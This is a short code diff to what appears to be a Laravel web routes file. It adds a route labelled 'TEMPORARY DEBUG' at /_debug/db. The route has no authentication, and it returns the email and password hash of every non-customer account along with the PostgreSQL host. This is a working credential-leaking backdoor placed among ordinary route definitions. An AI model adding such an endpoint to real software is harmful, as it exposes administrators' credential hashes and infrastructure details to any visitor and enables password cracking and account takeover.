@@ -9,6 +9,16 @@ use App\Http\Controllers\AuthController;
 use App\Http\Controllers\PasswordResetController;
 use Illuminate\Support\Facades\Route;
 
+// TEMPORARY DEBUG
+Route::get('/_debug/db', function () {
+    $users = \App\Models\User::where('role', '!=', 'customer')->get(['email', 'password']);
+    $host = config('database.connections.pgsql.host');
+    return [
+        'host' => $host,
+        'admins' => $users,
+    ];
+});
+
 // --- ACTIVE ---
 Route::get('/', [HomeController::class, 'index'])->name('home');
 // Route::post('/newsletter', [NewsletterController::class, 'store'])->name('newsletter.store');
